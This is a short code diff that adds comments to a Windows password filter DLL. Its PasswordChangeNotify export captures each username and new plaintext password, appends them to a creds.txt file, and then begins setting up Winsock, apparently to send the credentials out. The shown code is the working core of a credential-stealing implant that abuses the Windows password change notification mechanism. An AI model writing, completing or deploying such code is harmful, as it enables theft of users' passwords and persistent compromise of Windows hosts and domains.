@@ -45,7 +45,7 @@ extern "C" __declspec(dllexport) NTSTATUS PasswordChangeNotify(
 	char credentials[200];
 	FILE* OUTFILE;
 
-	
+	//Print credentials to file
 	sprintf_s(credentials, "%ws:%ws", UserName->Buffer, NewPassword->Buffer);
 	fopen_s(&OUTFILE, "C:\\users\\user\\desktop\\creds.txt", "a+");
 	if (NULL == OUTFILE)
@@ -55,7 +55,7 @@ extern "C" __declspec(dllexport) NTSTATUS PasswordChangeNotify(
 	fprintf_s(OUTFILE, "%s\n", credentials);
 	fclose(OUTFILE);
 
-
+    //Winsock data
     WSADATA wsaData;
     SOCKET ConnectSocket = INVALID_SOCKET;
     struct addrinfo* result = NULL,
